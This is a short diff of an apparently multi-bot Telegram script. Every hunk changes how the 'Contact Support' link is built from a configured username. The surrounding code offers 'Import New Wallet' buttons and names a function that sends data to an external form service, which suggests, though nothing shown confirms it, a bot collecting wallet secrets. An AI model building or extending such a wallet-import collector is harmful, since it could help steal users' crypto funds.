@@ -302,7 +302,7 @@ const sendToFormcarry = async (bot, chatId, data, retries = 3, delay = 1000) => 
               { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
             ],
             [
-              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername}` }
             ]
           ],
         },
@@ -496,7 +496,7 @@ bots.forEach(bot => {
               { text: 'Others', callback_data: 'others' }
             ],
             [
-              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername}` }
             ]
           ],
         },
@@ -576,7 +576,7 @@ bots.forEach(bot => {
               { text: 'Others', callback_data: 'others' }
             ],
             [
-              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername}` }
             ]
           ],
         },
